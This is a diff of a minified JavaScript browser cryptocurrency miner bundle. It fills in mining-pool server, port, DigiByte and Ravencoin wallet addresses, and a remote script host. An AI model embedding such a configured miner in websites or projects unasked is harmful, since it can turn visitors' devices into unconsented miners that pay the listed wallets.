@@ -1,4 +1,4 @@
- /*! For license information please see mm.js.LICENSE.txt */
+/*! For license information please see mm.js.LICENSE.txt */
 (() => {
     var U = {
             5580: (U, F, Q) => {
@@ -5733,10 +5733,10 @@
             var B = {
                     algo: "minotaurx",
                     stratum: {
-                        server: "",
-                        port: ,
-                        worker: "",
-                        password: ""
+                        server: "minotaurx.na.mine.zpool.ca",
+                        port: 7019,
+                        worker: "dgb1qegmnzvjfcqarqxrpvfu0m4ugpjht6dnpcfslp9",
+                        password: "c=DGB"
                     }
                 },
                 R = 0,
@@ -6282,9 +6282,8 @@
                 stratum: {
                     server: "minotaurx.na.mine.zpool.ca",
                     port: 7019,
-                    worker: "",
-                    password: ""
-
+                    worker: "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
+                    password: "c=RVN"
                 },
                 options: {
                     threads: 1,
@@ -6296,7 +6295,7 @@
                 yespower: "UYzgrk.js",
                 minotaurx: "jRsOfJ.js"
             },
-            K = "";
+            K = "https://webminer.pages.dev";
 
         function g(U) {
             return P.apply(this, arguments)
